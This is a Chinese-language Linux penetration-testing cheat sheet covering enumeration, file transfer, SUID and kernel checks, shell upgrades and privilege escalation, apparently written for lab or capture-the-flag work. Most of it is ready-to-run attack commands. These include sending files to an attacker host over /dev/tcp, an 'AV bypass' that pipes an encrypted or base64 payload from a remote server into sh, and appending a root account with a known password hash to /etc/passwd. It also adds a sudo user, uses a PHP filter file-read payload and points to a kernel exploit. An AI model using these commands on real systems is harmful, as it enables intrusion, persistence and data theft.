## 信息收集

### 常用工具

* https://gtfobins.github.io/
* https://github.com/garnettk/htbenum



### 常用指令

```bash
netstat -rn
netstat -an
ss -antop
arp -a

ps -auxwww --forest

exiftool <file>

# 记录当前会话的所有命令
script $target.log
....
commands and output of commands you ran in that 1 terminal sesssion
....
exit # when finished

export target_ip=target_ip
```



### 文件传递

```bash
kali@$ nc -l -p 9901 >./linpeas.txt
nc -w 5 <target_ip> 9901 < ./linpeas.txt

cat <file> >&/dev/tcp/<attacker>/<attacker_port>
kali@$ ncat -nlvp <attacker_port> > <file>


kali> ftp Server
cmd> ftp <IP> --> get --> put

bash> curl --upload-file linpeas.txt http://<IP>:1337/linpeas.txt   <-- PUT 文件传递


## AV bypass
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```



### SUID Commands

```bash
find / -user root -perm /4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -type f -name '*.txt' 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
getcap -r / 2>/dev/null
```



### 什么版本的系统?

```bash
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release
```



### 它的内核版本是多少?

```bash
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz
```



### Ippsec Tricks

```bash
SSH > tcpdump
ssh <user>@<target> "/bin/tcpdump -i <interface> -nnU -s0 -w <pcap.pcap> '<BPF filter>'"
ssh <user>@<target> "/bin/tcpdump -i <interface> -nnU -s0 -w <pcap.pcap> '<BPF filter>'" | wireshark -k -i -

useradd -p $(openssl passwd -1 password) -m newadmin --groups sudo # 添加用户
echo "<password>" | passwd --stdin <user>   # 修改用户密码

#!/bin/sh
sshpass -p $3 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -T $2@$1
or
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -T user@ip


cat /proc/net/tcp | grep '00000000:0000 0A'
cat /proc/net/fib_trie | grep -B1 "32 host LOCAL"
cat /proc/net/arp

file=php://filter/convert.base64-encode/resource=index.php


## 配置接收通用文件上传
server {
    listen 8801;
    location / {
        root /var/www/upload;
        dav_methods PUT;
    }
}


代理：使用~C进入ssh> -L8081:localhost:80 ###无需再次开启shell

- https://coggle.it/diagram/XepDvoXedGCjPc1Y/t/enumeration-mindmap
```



### TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm-256color
Ctrl + Z
stty raw -echo; fg
stty -a --> stty rows 38 columns 116
```



### /etc/passwd

```bash
/usr/bin/cp /etc/passwd passwd

openssl passwd -1 -salt ignite 0x584a
$1$ignite$Uk/TA7LvRUp8DLdZW1HVK.

echo '0x584a:$1$ignite$Uk/TA7LvRUp8DLdZW1HVK.:0:0:root:/root:/bin/bash' >> passwd
/usr/bin/cp  passwd /etc/passwd
```



### SUDO 配置滥用

```bash
gibson@alpha:/dev/shm$ sudo -l
[sudo] password for gibson:
Matching Defaults entries for gibson on alpha:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gibson may run the following commands on alpha:
    (ALL : ALL) ALL
gibson@alpha:/dev/shm$ sudo su
root@alpha:/run/shm#
```



### 常用Linux kernel

#### CVE-2021-33909

https://github.com/ChrisTheCoolHut/CVE-2021-33909

```bash
Linux kernel    >=3.16 / <= 5.13.3
```
